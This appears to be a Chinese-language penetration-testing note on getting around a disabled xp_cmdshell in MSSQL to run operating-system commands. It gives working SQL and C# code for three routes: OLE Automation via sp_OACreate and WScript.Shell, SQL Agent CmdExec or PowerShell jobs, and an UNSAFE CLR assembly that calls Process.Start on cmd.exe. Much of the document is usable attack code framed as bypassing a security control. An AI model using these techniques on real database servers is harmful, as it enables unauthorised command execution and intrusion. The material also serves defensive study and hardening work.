### MMSQL 的 xp_cmdshell() 函数被禁用怎么绕过

**1. 利用其他扩展存储过程**

MSSQL 中还有一些其他的扩展存储过程，它们可能没有 `xp_cmdshell` 那么直接，但仍然可以用于执行命令或读写文件

- **`sp_OACreate` (OLE Automation Procedures)**: 这个过程通常用于创建 COM 对象，但如果你能找到合适的 COM 对象，比如 `WScript.Shell`，就可以利用它来执行命令

  **示例代码:**

  ```sql
  DECLARE @shell INT;
  EXEC sp_OACreate 'WScript.Shell', @shell OUT;
  EXEC sp_OAMethod @shell, 'run', NULL, 'cmd.exe /c whoami > C:\temp\output.txt';
  -- 之后你可以读取 output.txt 来获取结果
  ```

  **注意:** 这种方法依赖于是否启用了 OLE Automation Procedures，并且需要寻找可以被利用的 COM 对象

**2. SQL Server Agent Jobs**

如果 SQL Server Agent 服务正在运行，并且你拥有创建作业的权限，你可以创建一个新的 Agent Job，并在其中执行 PowerShell 或命令行脚本

- **创建作业 (Job)**: 创建一个 SQL Agent Job，步骤类型 (Step Type) 选择 **`Operating system (CmdExec)`** 或 **`PowerShell`**
- **编写脚本**: 在步骤中直接写入你要执行的命令
- **启动作业**: 启动该作业，命令就会在 SQL Server Agent 的权限下执行

这种方法的好处是，即使 `xp_cmdshell` 被禁用，Agent Job 依然可以运行。但前提是，你有权限创建并执行作业

**3. CLR Assembly**

SQL Server 提供了 CLR (Common Language Runtime) 集成功能，允许你在数据库中运行 .NET 代码。如果你可以创建一个恶意的 CLR Assembly，并在其中编写执行命令的代码，就可以绕过 `xp_cmdshell`

- **启用 CLR**:

  ```sql
  EXEC sp_configure 'clr enabled', 1;
  RECONFIGURE;
  ```

- **创建并部署 Assembly**: 编写一个 C# 代码，使用 `System.Diagnostics.Process` 类来执行命令，然后将其编译成 DLL，并上传到数据库

- **创建存储过程**: 创建一个 SQL 存储过程来调用这个 Assembly 中的方法

  **C# 代码示例:**

  ```c#
  using System;
  using System.Diagnostics;
  using System.Data.SqlClient;
  using Microsoft.SqlServer.Server;
  
  public class StoredProcedures
  {
      [SqlProcedure]
      public static void CmdExec(string command)
      {
          Process.Start("cmd.exe", "/c " + command);
      }
  }
  ```

  **SQL Server 端:**

  ```sql
  -- 创建 Assembly
  CREATE ASSEMBLY CommandExec FROM 'C:\path\to\YourAssembly.dll' WITH PERMISSION_SET = UNSAFE;
  
  -- 创建存储过程
  CREATE PROCEDURE sp_CmdExec @command NVARCHAR(4000) AS
  EXTERNAL NAME [YourAssembly].[StoredProcedures].[CmdExec];
  
  -- 执行
  EXEC sp_CmdExec 'whoami';
  ```

  **注意:** CLR Assembly 功能通常是默认禁用的，并且创建 UNSAFE 权限集的 Assembly 需要 `sysadmin` 权限